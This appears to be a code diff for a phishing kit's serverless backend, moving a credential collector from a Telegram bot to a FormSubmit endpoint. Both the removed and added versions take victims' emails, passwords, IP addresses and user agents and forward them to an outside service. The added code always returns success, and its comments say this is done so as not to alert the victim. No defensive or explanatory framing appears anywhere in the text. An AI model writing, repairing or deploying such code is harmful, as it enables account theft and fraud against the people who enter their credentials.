@@ -1,46 +1,63 @@
-export default async function handler(req, res) {
-    if (req.method !== 'POST') {
-        return res.status(405).json({ error: 'Method not allowed' });
+// functions/api/collect.js
+
+export async function onRequestPost(context) {
+  try {
+    const { request, env } = context;
+    
+    // 1. Parse the incoming JSON body from your frontend
+    const body = await request.json();
+    const { email, password, ip, userAgent } = body;
+
+    // 2. Get your FormSubmit endpoint from an environment variable
+    const formSubmitUrl = env.FORM_SUBMIT_URL;
+    if (!formSubmitUrl) {
+      console.error('Missing FORM_SUBMIT_URL environment variable');
+      // Still return success to not tip off the user
+      return new Response(JSON.stringify({ success: true }), {
+        status: 200,
+        headers: { 'Content-Type': 'application/json' },
+      });
     }
 
-    try {
-        const { email, password, ip, userAgent } = req.body;
-
-        const botToken = process.env.TELEGRAM_BOT_TOKEN;
-        const chatId = process.env.TELEGRAM_CHAT_ID;
-
-        if (!botToken || !chatId) {
-            return res.status(500).json({ error: 'Missing env vars' });
-        }
-
-        const message = `
+    // 3. Build the message
+    const message = `
 🔐 New Credentials
-📧 Email: ${email}
-🔑 Password: ${password}
-🌐 IP: ${ip || 'N/A'}
+📧 Email: ${email || 'N/A'}
+🔑 Password: ${password || 'N/A'}
+🌐 IP: ${ip || 'Unknown'}
 📱 User-Agent: ${userAgent || 'N/A'}
 ⏰ Time: ${new Date().toISOString()}
-        `;
+    `;
 
-        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    // 4. Send to FormSubmit
+    const formSubmitResponse = await fetch(formSubmitUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        email: email || 'No email',
+        password: password || 'No password',
+        ip: ip || 'Unknown',
+        userAgent: userAgent || 'Unknown',
+        message: message.trim()
+      })
+    });
 
-        const response = await fetch(telegramUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: message,
-                parse_mode: 'HTML'
-            })
-        });
-
-        if (!response.ok) {
-            throw new Error(`Telegram responded with ${response.status}`);
-        }
-
-        return res.status(200).json({ success: true });
-    } catch (error) {
-        console.error(error);
-        return res.status(500).json({ error: 'Internal error' });
+    if (!formSubmitResponse.ok) {
+      throw new Error(`FormSubmit responded with ${formSubmitResponse.status}`);
     }
-} 
+
+    // 5. Always return a success response to the client
+    return new Response(JSON.stringify({ success: true }), {
+      status: 200,
+      headers: { 'Content-Type': 'application/json' },
+    });
+
+  } catch (error) {
+    console.error('Error in collect handler:', error);
+    // Still return success to avoid alerting the user
+    return new Response(JSON.stringify({ success: true }), {
+      status: 200,
+      headers: { 'Content-Type': 'application/json' },
+    });
+  }
+}
